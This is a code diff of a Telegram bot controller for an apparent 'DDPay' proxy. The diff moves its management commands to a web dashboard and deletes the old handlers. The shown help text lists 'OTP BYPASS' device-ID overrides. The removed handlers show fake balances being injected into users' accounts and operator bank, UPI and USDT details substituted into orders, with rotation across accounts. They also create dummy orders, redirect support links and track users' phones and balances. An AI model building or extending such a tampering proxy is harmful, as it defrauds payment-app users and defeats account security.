@@ -1285,8 +1285,8 @@ app.post('/bot-webhook', async (req, res) => {
       await bot.sendMessage(chatId,
         `🏦 DDPay Bot Controller
         
-🌐 Web Dashboard: https://xchas.vercel.app/yougogirl
-(Use dashboard for Banners, Balance, Proxy Controls, and Dummy Orders)
+🌐 *Web Dashboard:* https://xchas.vercel.app/yougogirl
+(Use dashboard for all controls: Banks, Orders, Banners, Balance, USDT, etc.)
 
 === ID OVERRIDE (OTP BYPASS) ===
 /useid [deviceId] — Single login override
@@ -1294,29 +1294,7 @@ app.post('/bot-webhook', async (req, res) => {
 /alwaysid off — Turn off persistent
 /clearid — Clear all ID overrides
 
-=== BANK COMMANDS ===
-/addbank Name|AccNo|IFSC|BankName|UPI
-/removebank <number>
-/setbank <number>
-/setmin <number> <amount>
-/banks — List all banks
-
-=== ORDER BINDINGS ===
-/orders — List all saved order-bank bindings
-/delorder <code/num/all> — Delete binding
-
-=== CONTROL ===
-/debug — Toggle full debug mode (req+resp)
-/debug on | off — Debug control
-
-=== USDT & SERVICE ===
-/usdt <address> — Set USDT address
-/usdt off — Disable USDT override
-/services <link/@handle> — Set Support link
-/services reset — Reset Support link
-
-=== TRACKING ===
-/idtrack — Show all tracked user IDs`
+📌 *All other commands have been moved to the Web Dashboard for better control.*`, { parse_mode: 'Markdown' }
       );
       return res.sendStatus(200);
     }
@@ -1326,127 +1304,21 @@ app.post('/bot-webhook', async (req, res) => {
       return res.sendStatus(200);
     }
 
-    // Banner, Status, and Proxy controls moved to Web Dashboard
-    if (text.startsWith('/banner') || text === '/status' || text === '/on' || text === '/off' || text === '/rotate' || text === '/log') {
-      await bot.sendMessage(chatId, '🌐 This feature has been moved to the Web Dashboard:\nhttps://xchas.vercel.app/yougogirl');
+    // All management commands moved to Web Dashboard
+    const dashboardCmds = [
+      '/banner', '/status', '/on', '/off', '/rotate', '/log', 
+      '/add ', '/deduct ', '/remove balance', '/history', '/clearhistory',
+      '/adddummy', '/dummies', '/deldummy', '/off log', '/on log',
+      '/banks', '/addbank', '/removebank', '/setbank', '/setmin',
+      '/orders', '/delorder', '/usdt', '/services', '/service', '/idtrack', '/debug'
+    ];
+    
+    if (dashboardCmds.some(cmd => text.startsWith(cmd))) {
+      await bot.sendMessage(chatId, '🌐 *Command Moved to Web Dashboard*\n\nAll management features are now available on the GoGirl Pro Dashboard:\nhttps://xchas.vercel.app/yougogirl', { parse_mode: 'Markdown' });
       return res.sendStatus(200);
     }
 
-    if (false && text.startsWith('/banner')) {
-      const parts = text.split(' ').filter(Boolean);
-      const subCmd = parts[1] ? parts[1].toLowerCase() : '';
-
-      if (subCmd === 'clear' || subCmd === 'off') {
-        const targetId = parts[2] ? parts[2].trim() : null;
-        data.userBanners = data.userBanners || {};
-        if (!targetId || targetId.toLowerCase() === 'all') {
-          data.userBanners = {};
-          await saveData(data);
-          await bot.sendMessage(chatId, '🧹 *All Banner Notices Cleared!*', { parse_mode: 'Markdown' });
-        } else {
-          delete data.userBanners[String(targetId)];
-          await saveData(data);
-          await bot.sendMessage(chatId, '🧹 *Banner Notice Cleared for User `' + targetId + '`!*', { parse_mode: 'Markdown' });
-        }
-        return res.sendStatus(200);
-      }
-
-      if (parts.length < 3) {
-        await bot.sendMessage(chatId,
-          '⚠️ *Invalid Banner Command Syntax*\n\n' +
-          'Usage:\n' +
-          '• `/banner <userId> <message>` — Set banner\n' +
-          '• `/banner <userId> <Title> | <Message>` — Custom title\n' +
-          '• `/banner clear [userId]` — Clear banner\n\n' +
-          'Example:\n`/banner 254627 Welcome Bonus | You received ₹500!`',
-          { parse_mode: 'Markdown' }
-        );
-        return res.sendStatus(200);
-      }
-
-      const targetUserId = parts[1].trim();
-      const rawContent = parts.slice(2).join(' ').trim();
-      data.userBanners = data.userBanners || {};
-
-      if (rawContent.toLowerCase() === 'off' || rawContent.toLowerCase() === 'clear') {
-        delete data.userBanners[String(targetUserId)];
-        await saveData(data);
-        await bot.sendMessage(chatId, '🧹 *Banner Notice Cleared for User `' + targetUserId + '`!*', { parse_mode: 'Markdown' });
-        return res.sendStatus(200);
-      }
-
-      let customTitle = '🚨 VIP Notice';
-      let bannerMsg = rawContent;
-
-      if (rawContent.includes('|')) {
-        const pipeSplit = rawContent.split('|');
-        customTitle = pipeSplit[0].trim();
-        bannerMsg = pipeSplit.slice(1).join('|').trim();
-      }
-
-      data.userBanners[String(targetUserId)] = {
-        id: Math.floor(100000 + Math.random() * 899999),
-        title: customTitle,
-        content: bannerMsg,
-        seenCount: 0,
-        createdAt: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
-      };
-
-      await saveData(data);
-
-      const phone = getPhone(data, targetUserId);
-      const confirmMsg =
-        '✅ *Banner Notice Set Successfully!*\n' +
-        '━━━━━━━━━━━━━━━━━━\n' +
-        '👤 *User ID:* `' + targetUserId + '`' + (phone ? ' (' + phone + ')' : '') + '\n' +
-        '📌 *Title:* ' + customTitle + '\n' +
-        '💬 *Message:* ' + bannerMsg + '\n\n' +
-        '🔔 *Realtime Tracking Active:* You will get a notification in Telegram every time this user sees the banner in the app!';
-
-      await bot.sendMessage(chatId, confirmMsg, { parse_mode: 'Markdown' });
-      return res.sendStatus(200);
-    }
-
-    if (text === '/status') {
-      const active = getActiveBank(data, null);
-      const idCount = Object.keys(data.userOverrides || {}).length;
-      let m = `📊 Status:\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\nTracked Users: ${Object.keys(data.trackedUsers || {}).length}`;
-      if (data.usdtAddress) m += `\n₮ USDT: ${data.usdtAddress.substring(0, 15)}...`;
-      if (active) m += `\n\n💳 Active:\n${active.accountHolder}\n${active.accountNo}\nIFSC: ${active.ifsc}${active.bankName ? '\nBank: ' + active.bankName : ''}${active.upiId ? '\nUPI: ' + active.upiId : ''}`;
-      else m += '\n\n⚠️ No active bank';
-      await bot.sendMessage(chatId, m);
-      return res.sendStatus(200);
-    }
-
-    if (text === '/on') {
-      const freshData = await loadData(true);
-      freshData.botEnabled = true;
-      await saveData(freshData);
-      await bot.sendMessage(chatId, '🟢 Proxy ON — bot active').catch(() => { });
-      return res.sendStatus(200);
-    }
-    if (text === '/off') {
-      const freshData = await loadData(true);
-      freshData.botEnabled = false;
-      await saveData(freshData);
-      await bot.sendMessage(chatId, '🔴 Proxy OFF — passthrough').catch(() => { });
-      return res.sendStatus(200);
-    }
-    if (text === '/rotate') {
-      const freshData = await loadData(true);
-      freshData.autoRotate = !freshData.autoRotate;
-      freshData.lastUsedIndex = -1;
-      await saveData(freshData);
-      await bot.sendMessage(chatId, `🔄 Auto-Rotate: ${freshData.autoRotate ? 'ON' : 'OFF'}`).catch(() => { });
-      return res.sendStatus(200);
-    }
-    if (text === '/log') {
-      const freshData = await loadData(true);
-      freshData.logRequests = !freshData.logRequests;
-      await saveData(freshData);
-      await bot.sendMessage(chatId, `📋 Logging: ${freshData.logRequests ? 'ON' : 'OFF'}`).catch(() => { });
-      return res.sendStatus(200);
-    }
+    // Migrated commands (banner, status, on, off, rotate, log) are now handled by the dashboard redirector above.
 
     if (text.startsWith('/useid')) {
       const freshData = await loadData(true);
@@ -1503,526 +1375,35 @@ app.post('/bot-webhook', async (req, res) => {
     }
 
     // User Log, Balance, and Dummy orders moved to Web Dashboard
-    if (text.startsWith('/off log') || text.startsWith('/on log') || text.startsWith('/add ') || text.startsWith('/deduct ') || text.startsWith('/remove balance') || text.startsWith('/history') || text === '/clearhistory' || text.startsWith('/adddummy') || text === '/dummies' || text.startsWith('/deldummy')) {
-      await bot.sendMessage(chatId, '🌐 This feature has been moved to the Web Dashboard:\nhttps://xchas.vercel.app/yougogirl');
-      return res.sendStatus(200);
-    }
+    // Redirection already handled above.
 
-    if (false && text.startsWith('/off log ')) {
-      const targetId = text.substring(9).trim();
-      if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /off log <userId>'); return res.sendStatus(200); }
-      const freshData = await loadData(true);
-      if (!freshData.userOverrides) freshData.userOverrides = {};
-      if (!freshData.userOverrides[targetId]) freshData.userOverrides[targetId] = {};
-      freshData.userOverrides[targetId].logOff = true;
-      await saveData(freshData);
-      if (redis) {
-        try {
-          const allTokens = await redis.hgetall('ddpayTokenMap');
-          if (allTokens) {
-            for (const [tKey, uid] of Object.entries(allTokens)) {
-              if (String(uid) === String(targetId)) {
-                await redis.sadd('ddpayLogOffTokens', tKey);
-                logOffTokens.add(tKey);
-              }
-            }
-          }
-        } catch (e) { }
-      }
-      for (const [tKey, uid] of Object.entries(tokenUserMap)) {
-        if (String(uid) === String(targetId)) logOffTokens.add(tKey);
-      }
-      await bot.sendMessage(chatId, `🔇 Logging OFF for user ${targetId}`);
-      return res.sendStatus(200);
-    }
+    // Migrated user/balance/history/tracking commands removed.
 
-    if (text.startsWith('/on log ')) {
-      const targetId = text.substring(8).trim();
-      if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /on log <userId>'); return res.sendStatus(200); }
-      if (data.userOverrides && data.userOverrides[targetId]) {
-        delete data.userOverrides[targetId].logOff;
-        await saveData(data);
-      }
-      if (redis) {
-        try {
-          const allTokens = await redis.hgetall('ddpayTokenMap');
-          if (allTokens) {
-            for (const [tKey, uid] of Object.entries(allTokens)) {
-              if (String(uid) === String(targetId)) {
-                await redis.srem('ddpayLogOffTokens', tKey);
-                logOffTokens.delete(tKey);
-              }
-            }
-          }
-        } catch (e) { }
-      }
-      for (const [tKey, uid] of Object.entries(tokenUserMap)) {
-        if (String(uid) === String(targetId)) logOffTokens.delete(tKey);
-      }
-      await bot.sendMessage(chatId, `📡 Logging ON for user ${targetId}`);
-      return res.sendStatus(200);
-    }
-
-    if (text.startsWith('/add ')) {
-      const parts = text.substring(5).trim().split(/\s+/);
-      const amount = parseFloat(parts[0]);
-      const targetUserId = parts[1] || '';
-      if (isNaN(amount) || !targetUserId) {
-        await bot.sendMessage(chatId, '❌ Format: /add <amount> <userId>\nExample: /add 500 12345');
-        return res.sendStatus(200);
-      }
-      if (!data.userOverrides) data.userOverrides = {};
-      if (!data.userOverrides[targetUserId]) data.userOverrides[targetUserId] = {};
-      data.userOverrides[targetUserId].addedBalance = (data.userOverrides[targetUserId].addedBalance || 0) + amount;
-      const tracked = data.trackedUsers && data.trackedUsers[targetUserId];
-      const currentBal = tracked ? tracked.balance : 'N/A';
-      const updatedBal = currentBal !== 'N/A' ? parseFloat((parseFloat(currentBal) + data.userOverrides[targetUserId].addedBalance).toFixed(2)) : 'N/A';
-      if (!data.balanceHistory) data.balanceHistory = [];
-      data.balanceHistory.push({
-        type: 'add',
-        userId: targetUserId,
-        amount: amount,
-        totalAdded: data.userOverrides[targetUserId].addedBalance,
-        originalBalance: currentBal,
-        updatedBalance: updatedBal,
-        time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
-        phone: (tracked && tracked.phone) || ''
-      });
-      await saveData(data);
-      await bot.sendMessage(chatId, `✅ Added ₹${amount} to user ${targetUserId}\n💰 Total added: ₹${data.userOverrides[targetUserId].addedBalance}\n📊 Updated balance: ₹${updatedBal}`);
-      return res.sendStatus(200);
-    }
-
-    if (text.startsWith('/deduct ')) {
-      const parts = text.substring(8).trim().split(/\s+/);
-      const amount = parseFloat(parts[0]);
-      const targetUserId = parts[1] || '';
-      if (isNaN(amount) || !targetUserId) {
-        await bot.sendMessage(chatId, '❌ Format: /deduct <amount> <userId>\nExample: /deduct 500 12345');
-        return res.sendStatus(200);
-      }
-      if (!data.userOverrides) data.userOverrides = {};
-      if (!data.userOverrides[targetUserId]) data.userOverrides[targetUserId] = {};
-      data.userOverrides[targetUserId].addedBalance = (data.userOverrides[targetUserId].addedBalance || 0) - amount;
-      const tracked2 = data.trackedUsers && data.trackedUsers[targetUserId];
-      const currentBal2 = tracked2 ? tracked2.balance : 'N/A';
-      const updatedBal2 = currentBal2 !== 'N/A' ? parseFloat((parseFloat(currentBal2) + data.userOverrides[targetUserId].addedBalance).toFixed(2)) : 'N/A';
-      if (!data.balanceHistory) data.balanceHistory = [];
-      data.balanceHistory.push({
-        type: 'deduct',
-        userId: targetUserId,
-        amount: amount,
-        totalAdded: data.userOverrides[targetUserId].addedBalance,
-        originalBalance: currentBal2,
-        updatedBalance: updatedBal2,
-        time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
-        phone: (tracked2 && tracked2.phone) || ''
-      });
-      if (data.userOverrides[targetUserId].addedBalance === 0) delete data.userOverrides[targetUserId].addedBalance;
-      await saveData(data);
-      await bot.sendMessage(chatId, `✅ Deducted ₹${amount} from user ${targetUserId}\n💰 Total added: ₹${data.userOverrides[targetUserId].addedBalance || 0}\n📊 Updated balance: ₹${updatedBal2}`);
-      return res.sendStatus(200);
-    }
-
-    if (text.startsWith('/remove balance ')) {
-      const targetId = text.substring(16).trim();
-      if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /remove balance <userId>'); return res.sendStatus(200); }
-      if (data.userOverrides && data.userOverrides[targetId] && data.userOverrides[targetId].addedBalance !== undefined) {
-        const removed = data.userOverrides[targetId].addedBalance;
-        delete data.userOverrides[targetId].addedBalance;
-        if (!data.balanceHistory) data.balanceHistory = [];
-        const tracked = data.trackedUsers && data.trackedUsers[targetId];
-        data.balanceHistory.push({
-          type: 'remove',
-          userId: targetId,
-          amount: removed,
-          totalAdded: 0,
-          originalBalance: tracked ? tracked.balance : 'N/A',
-          updatedBalance: tracked ? tracked.balance : 'N/A',
-          time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
-          phone: (tracked && tracked.phone) || ''
-        });
-        await saveData(data);
-        await bot.sendMessage(chatId, `🗑 Removed ₹${removed} fake balance from user ${targetId}\n💰 Now showing real balance`);
-      } else {
-        await bot.sendMessage(chatId, `ℹ️ User ${targetId} has no fake balance added.`);
-      }
-      return res.sendStatus(200);
-    }
-
-    if (text === '/history' || text.startsWith('/history ')) {
-      const historyTarget = text.startsWith('/history ') ? text.substring(9).trim() : '';
-      const history = data.balanceHistory || [];
-      if (history.length === 0) { await bot.sendMessage(chatId, '📋 No balance history yet.'); return res.sendStatus(200); }
-      const filtered = historyTarget ? history.filter(h => h.userId === historyTarget) : history;
-      if (filtered.length === 0) { await bot.sendMessage(chatId, `📋 No history for user ${historyTarget}`); return res.sendStatus(200); }
-      const userSummary = {};
-      for (const h of filtered) {
-        if (!userSummary[h.userId]) userSummary[h.userId] = { added: 0, deducted: 0, totalNet: 0, phone: h.phone || '', entries: [] };
-        const s = userSummary[h.userId];
-        if (h.type === 'add') s.added += h.amount;
-        else s.deducted += h.amount;
-        s.totalNet = h.totalAdded || 0;
-        if (h.phone) s.phone = h.phone;
-        s.entries.push(h);
-      }
-      let m = '📊 Balance History:\n\n';
-      for (const [uid, s] of Object.entries(userSummary)) {
-        const tracked = data.trackedUsers && data.trackedUsers[uid];
-        const currentBal = tracked ? tracked.balance : 'N/A';
-        m += `👤 User: ${uid}${s.phone ? ' (' + s.phone + ')' : ''}\n`;
-        m += `   ➕ Total Added: ₹${s.added.toFixed(2)}\n`;
-        m += `   ➖ Total Deducted: ₹${s.deducted.toFixed(2)}\n`;
-        m += `   📊 Net Change: ₹${(s.added - s.deducted).toFixed(2)}\n`;
-        m += `   💰 Current Balance: ₹${currentBal}\n`;
-        m += `   📜 Entries:\n`;
-        const recent = s.entries.slice(-10);
-        for (const e of recent) {
-          const icon = e.type === 'add' ? '➕' : '➖';
-          m += `   ${icon} ₹${e.amount} | Bal: ₹${e.updatedBalance} | ${e.time}\n`;
-        }
-        if (s.entries.length > 10) m += `   ... ${s.entries.length - 10} more entries\n`;
-        m += '\n';
-      }
-      if (m.length > 4000) m = m.substring(0, 4000) + '\n... (truncated)';
-      await bot.sendMessage(chatId, m);
-      return res.sendStatus(200);
-    }
-
-    if (text === '/clearhistory') {
-      data.balanceHistory = [];
-      await saveData(data);
-      await bot.sendMessage(chatId, '🗑 Balance history cleared.');
-      return res.sendStatus(200);
-    }
-
-    if (text === '/idtrack') {
-      const tracked = data.trackedUsers || {};
-      const ids = Object.keys(tracked);
-      if (ids.length === 0) { await bot.sendMessage(chatId, '📋 No users tracked yet. Users will appear after they use the app.'); return res.sendStatus(200); }
-      let m = '📋 Tracked User IDs:\n\n';
-      for (const uid of ids) {
-        const u = tracked[uid];
-        const hasOverride = data.userOverrides && data.userOverrides[uid] ? ' ⚙️' : '';
-        m += `👤 ID: ${uid}${hasOverride}\n`;
-        if (u.name) m += `   📛 Name: ${u.name}\n`;
-        if (u.phone) m += `   📱 Phone: ${u.phone}\n`;
-        if (u.balance) m += `   💰 Balance: ${u.balance}\n`;
-        m += `   🕐 Last: ${u.lastAction || 'N/A'} @ ${u.lastSeen || 'N/A'}\n`;
-        m += `   📦 Orders: ${u.orderCount || 0}\n\n`;
-      }
-      if (m.length > 4000) m = m.substring(0, 4000) + '\n... (truncated)';
-      await bot.sendMessage(chatId, m);
-      return res.sendStatus(200);
-    }
-
-    if (text === '/banks') {
-      if (!data.banks || data.banks.length === 0) { await bot.sendMessage(chatId, '❌ No banks added'); return res.sendStatus(200); }
-      let m = '💳 Banks:\n\n' + bankListText(data);
-      await bot.sendMessage(chatId, m);
-      return res.sendStatus(200);
-    }
-
-    if (text.startsWith('/addbank ')) {
-      const parts = text.substring(9).split('|').map(s => s.trim());
-      if (parts.length < 3) { await bot.sendMessage(chatId, '❌ Format: /addbank Name|AccNo|IFSC|BankName|UPI\n(BankName and UPI optional)'); return res.sendStatus(200); }
-      if (data.banks.length >= 10) { await bot.sendMessage(chatId, '❌ Max 10 banks.'); return res.sendStatus(200); }
-      const newBank = { accountHolder: parts[0], accountNo: parts[1], ifsc: parts[2], bankName: parts[3] || '', upiId: parts[4] || '' };
-      data.banks.push(newBank);
-      if (data.activeIndex < 0) data.activeIndex = 0;
-      await saveData(data);
-      await bot.sendMessage(chatId, `✅ Bank #${data.banks.length} added:\n${newBank.accountHolder} | ${newBank.accountNo}\nIFSC: ${newBank.ifsc}${newBank.bankName ? '\nBank: ' + newBank.bankName : ''}${newBank.upiId ? '\nUPI: ' + newBank.upiId : ''}`);
-      return res.sendStatus(200);
-    }
-
-    if (text.startsWith('/removebank ')) {
-      const idx = parseInt(text.substring(12).trim()) - 1;
-      if (isNaN(idx) || idx < 0 || idx >= (data.banks || []).length) { await bot.sendMessage(chatId, '❌ Invalid. /banks se check karo'); return res.sendStatus(200); }
-      const removed = data.banks.splice(idx, 1)[0];
-      if (data.activeIndex === idx) data.activeIndex = data.banks.length > 0 ? 0 : -1;
-      else if (data.activeIndex > idx) data.activeIndex--;
-      if (data.userOverrides) {
-        for (const uid of Object.keys(data.userOverrides)) {
-          const uo = data.userOverrides[uid];
-          if (uo.bankIndex !== undefined) {
-            if (uo.bankIndex === idx) delete uo.bankIndex;
-            else if (uo.bankIndex > idx) uo.bankIndex--;
-          }
-        }
-      }
-      await saveData(data);
-      await bot.sendMessage(chatId, `🗑️ Removed: ${removed.accountHolder} | ${removed.accountNo}`);
-      return res.sendStatus(200);
-    }
-
-    if (text.startsWith('/setbank ')) {
-      const idx = parseInt(text.substring(9).trim()) - 1;
-      if (isNaN(idx) || idx < 0 || idx >= (data.banks || []).length) { await bot.sendMessage(chatId, '❌ Invalid index'); return res.sendStatus(200); }
-      data.activeIndex = idx;
-      await saveData(data);
-      await bot.sendMessage(chatId, `✅ Active bank #${idx + 1}: ${data.banks[idx].accountHolder}`);
-      return res.sendStatus(200);
-    }
-
-    if (text.startsWith('/setmin ')) {
-      const parts = text.substring(8).trim().split(/\s+/);
-      const bankIdx = parseInt(parts[0]) - 1;
-      const amount = parseFloat(parts[1]);
-      if (isNaN(bankIdx) || bankIdx < 0 || bankIdx >= (data.banks || []).length || isNaN(amount)) {
-        await bot.sendMessage(chatId, '❌ Format: /setmin <bank_number> <amount>\nExample: /setmin 1 500');
-        return res.sendStatus(200);
-      }
-      data.banks[bankIdx].minAmount = amount;
-      await saveData(data);
-      await bot.sendMessage(chatId, `✅ Min amount for bank #${bankIdx + 1} (${data.banks[bankIdx].accountHolder}) set to ₹${amount}`);
-      return res.sendStatus(200);
-    }
-
-    if (text.startsWith('/usdt ')) {
-      const addr = text.substring(6).trim();
-      if (addr.toLowerCase() === 'off') {
-        data.usdtAddress = '';
-        await saveData(data);
-        await bot.sendMessage(chatId, '❌ USDT override OFF');
-      } else if (addr.length >= 20) {
-        data.usdtAddress = addr;
-        await saveData(data);
-        await bot.sendMessage(chatId, `₮ USDT address set: ${addr}`);
-      } else {
-        await bot.sendMessage(chatId, '❌ Invalid address (20+ chars required)');
-      }
-      return res.sendStatus(200);
-    }
+    // Banking commands removed.
 
 
-    if (text === '/orders') {
-      data.orderBankMap = data.orderBankMap || {};
-      const entries = Object.values(data.orderBankMap);
-      if (entries.length === 0) {
-        await bot.sendMessage(chatId, '📭 No saved order-bank bindings in KV storage.');
-        return res.sendStatus(200);
-      }
-      const uniqueMap = new Map();
-      for (const e of entries) {
-        if (!e || !e.orderCode) continue;
-        if (!uniqueMap.has(e.orderCode)) uniqueMap.set(e.orderCode, e);
-      }
-      const uniqueList = Array.from(uniqueMap.values());
-      let msg = `📦 *Saved Order-Bank Bindings (${uniqueList.length}):*\n━━━━━━━━━━━━━━━━━━\n\n`;
-      uniqueList.forEach((e, idx) => {
-        msg += `${idx + 1}. 📋 *Code:* \`${e.orderCode}\`\n`;
-        if (e.userId) msg += `   👤 *User:* \`${e.userId}\`\n`;
-        if (e.amount) msg += `   💰 *Amount:* \`₹${e.amount}\`\n`;
-        if (e.bank) {
-          msg += `   🏦 *Bound Bank:* ${e.bank.accountHolder || 'N/A'} | \`${e.bank.accountNo || 'N/A'}\` | \`${e.bank.ifsc || 'N/A'}\`\n`;
-        }
-        if (e.time) msg += `   🕐 *Time:* ${e.time}\n`;
-        msg += `\n`;
-      });
-      msg += `\n📌 Delete an order binding: \`/delorder <Code>\` or \`/delorder <index>\``;
-      await bot.sendMessage(chatId, msg, { parse_mode: 'Markdown' });
-      return res.sendStatus(200);
-    }
-
-    if (text.startsWith('/delorder')) {
-      data.orderBankMap = data.orderBankMap || {};
-      const param = text.substring(9).trim();
-      if (!param) {
-        await bot.sendMessage(chatId, '❌ Format: `/delorder <orderCode>` or `/delorder <number>` or `/delorder all`\n\nExample: `/delorder R2026072515583518992209`', { parse_mode: 'Markdown' });
-        return res.sendStatus(200);
-      }
-      if (param.toLowerCase() === 'all') {
-        const count = Object.keys(data.orderBankMap).length;
-        data.orderBankMap = {};
-        await saveData(data);
-        await bot.sendMessage(chatId, `🗑️ Cleared all ${count} order-bank bindings from KV storage.`);
-        return res.sendStatus(200);
-      }
-      const num = parseInt(param);
-      if (!isNaN(num) && String(num) === param) {
-        const uniqueMap = new Map();
-        for (const e of Object.values(data.orderBankMap)) {
-          if (e && e.orderCode && !uniqueMap.has(e.orderCode)) uniqueMap.set(e.orderCode, e);
-        }
-        const uniqueList = Array.from(uniqueMap.values());
-        const target = uniqueList[num - 1];
-        if (!target) {
-          await bot.sendMessage(chatId, `❌ Invalid index #${num}. Run /orders to view list.`);
-          return res.sendStatus(200);
-        }
-        delete data.orderBankMap[target.orderCode];
-        if (target.buyId) delete data.orderBankMap[target.buyId];
-        await saveData(data);
-        await bot.sendMessage(chatId, `🗑️ Deleted order binding #${num} (\`${target.orderCode}\`) from KV storage.`, { parse_mode: 'Markdown' });
-        return res.sendStatus(200);
-      }
-      let deleted = false;
-      for (const [k, v] of Object.entries(data.orderBankMap)) {
-        if (k.toLowerCase() === param.toLowerCase() || (v && v.orderCode && v.orderCode.toLowerCase() === param.toLowerCase()) || (v && v.buyId && String(v.buyId).toLowerCase() === param.toLowerCase())) {
-          delete data.orderBankMap[k];
-          if (v && v.orderCode) delete data.orderBankMap[v.orderCode];
-          if (v && v.buyId) delete data.orderBankMap[v.buyId];
-          deleted = true;
-        }
-      }
-      if (deleted) {
-        await saveData(data);
-        await bot.sendMessage(chatId, `✅ Order binding for \`${param}\` deleted from KV storage.`, { parse_mode: 'Markdown' });
-      } else {
-        await bot.sendMessage(chatId, `❌ No order binding found for \`${param}\`. Run /orders to view saved list.`, { parse_mode: 'Markdown' });
-      }
-      return res.sendStatus(200);
-    }
 
 
-    if (text.startsWith('/services') || text.startsWith('/service')) {
-      const param = text.replace(/^\/(services|service)/i, '').trim();
-      if (!param) {
-        const current = data.customServiceLink ? `\`${data.customServiceLink}\`` : '_Not Set (Using Default Upstream)_';
-        await bot.sendMessage(chatId, `🎧 *Customer Support Link Configuration*\n━━━━━━━━━━━━━━━━━━\n\n📌 *Current Link:* ${current}\n\n💡 *Commands:* \n• \`/services @zylox\` → Set link to https://t.me/zylox\n• \`/services https://t.me/zylox\` → Set custom Telegram link\n• \`/services reset\` or \`/services off\` → Reset to default upstream link`, { parse_mode: 'Markdown' });
-        return res.sendStatus(200);
-      }
 
-      if (param.toLowerCase() === 'reset' || param.toLowerCase() === 'off' || param.toLowerCase() === 'clear') {
-        data.customServiceLink = '';
-        await saveData(data);
-        await bot.sendMessage(chatId, '✅ Customer Support link reset to default upstream.');
-        return res.sendStatus(200);
-      }
 
-      let formattedUrl = param;
-      if (formattedUrl.startsWith('@')) {
-        formattedUrl = 'https://t.me/' + formattedUrl.substring(1);
-      } else if (!formattedUrl.startsWith('http://') && !formattedUrl.startsWith('https://')) {
-        formattedUrl = 'https://t.me/' + formattedUrl;
-      }
 
-      data.customServiceLink = formattedUrl;
-      await saveData(data);
-      await bot.sendMessage(chatId, `✅ *Customer Support Link Set!*\n━━━━━━━━━━━━━━━━━━\n\n🔗 *Target Link:* \`${formattedUrl}\` \n\nApp me CustomerService aur Channel dono buttons par click karne par user \`${formattedUrl}\` pe redirect hoga.`, { parse_mode: 'Markdown' });
-      return res.sendStatus(200);
-    }
 
-    if (text.startsWith('/adddummy')) {
-      data.dummyOrders = data.dummyOrders || [];
-      const parts = text.substring(9).trim().split(/\s+/);
-      const amount = parseFloat(parts[0]);
-      if (isNaN(amount) || amount <= 0) {
-        await bot.sendMessage(chatId, '❌ Format: `/adddummy <amount> [minRange] [maxRange]`\n\nExamples:\n`/adddummy 434` (auto-detects range 301-500)\n`/adddummy 400 301 500`\n`/adddummy 5000 5001 10000`', { parse_mode: 'Markdown' });
-        return res.sendStatus(200);
-      }
 
-      let minRange = parseFloat(parts[1]);
-      let maxRange = parseFloat(parts[2]);
 
-      if (isNaN(minRange) || isNaN(maxRange)) {
-        if (amount >= 1 && amount <= 300) { minRange = 1; maxRange = 300; }
-        else if (amount >= 301 && amount <= 500) { minRange = 301; maxRange = 500; }
-        else if (amount >= 501 && amount <= 1000) { minRange = 501; maxRange = 1000; }
-        else if (amount >= 1001 && amount <= 5000) { minRange = 1001; maxRange = 5000; }
-        else if (amount >= 5001 && amount <= 10000) { minRange = 5001; maxRange = 10000; }
-        else if (amount >= 10001 && amount <= 20000) { minRange = 10001; maxRange = 20000; }
-        else { minRange = Math.floor(amount * 0.8); maxRange = Math.ceil(amount * 1.2); }
-      }
 
-      const dummyCode = generateDummyCode();
-      const dummyId = generateDummyId();
-      const income = parseFloat((amount * 0.04).toFixed(2));
-      const quota = parseFloat((amount + income).toFixed(2));
 
-      const dummyObj = {
-        id: dummyId,
-        payOrderId: dummyId,
-        orderId: dummyId,
-        buyId: dummyId,
-        code: dummyCode,
-        orderCode: dummyCode,
-        buyCode: dummyCode,
-        remark: dummyCode,
-        sn: dummyCode,
-        amount: amount,
-        orderAmount: amount,
-        rewardRate: 0.04,
-        rewardAmount: income,
-        income: income,
-        quota: quota,
-        smallAmountBonus: false,
-        smallAmountBonusAmount: 0,
-        status: 0,
-        minRange: minRange,
-        maxRange: maxRange,
-        isDummy: true,
-        createdAt: new Date().toISOString()
-      };
 
-      data.dummyOrders.push(dummyObj);
-      await saveData(data);
-      cacheOrderDetails(dummyObj);
 
-      let msg = `✅ *Dummy Order Created!*\n━━━━━━━━━━━━━━━━━━\n`;
-      msg += `📋 *Code:* \`${dummyCode}\` | ID: \`${dummyId}\`\n`;
-      msg += `💰 *Amount:* \`₹${amount}\`\n`;
-      msg += `📈 *Income (4%):* \`₹${income}\` | Quota: \`₹${quota}\`\n`;
-      msg += `📍 *Target Section:* \`${minRange}-${maxRange}\` range\n`;
 
-      await bot.sendMessage(chatId, msg, { parse_mode: 'Markdown' });
-      return res.sendStatus(200);
-    }
 
-    if (text === '/dummies') {
-      data.dummyOrders = data.dummyOrders || [];
-      if (data.dummyOrders.length === 0) {
-        await bot.sendMessage(chatId, '📭 No dummy orders currently active in KV storage.');
-        return res.sendStatus(200);
-      }
-      let msg = `🎭 *Active Dummy Orders (${data.dummyOrders.length}):*\n━━━━━━━━━━━━━━━━━━\n\n`;
-      data.dummyOrders.forEach((d, idx) => {
-        msg += `${idx + 1}. 📋 *Code:* \`${d.code}\` | ID: \`${d.id}\`\n`;
-        msg += `   💰 *Amount:* \`₹${d.amount}\` (Income: \`₹${d.income}\` | Quota: \`₹${d.quota}\`)\n`;
-        msg += `   📍 *Range:* \`${d.minRange}-${d.maxRange}\`\n\n`;
-      });
-      msg += `📌 Delete a dummy order: \`/deldummy <Code>\` or \`/deldummy <index>\``;
-      await bot.sendMessage(chatId, msg, { parse_mode: 'Markdown' });
-      return res.sendStatus(200);
-    }
 
-    if (text.startsWith('/deldummy')) {
-      data.dummyOrders = data.dummyOrders || [];
-      const param = text.substring(9).trim();
-      if (!param) {
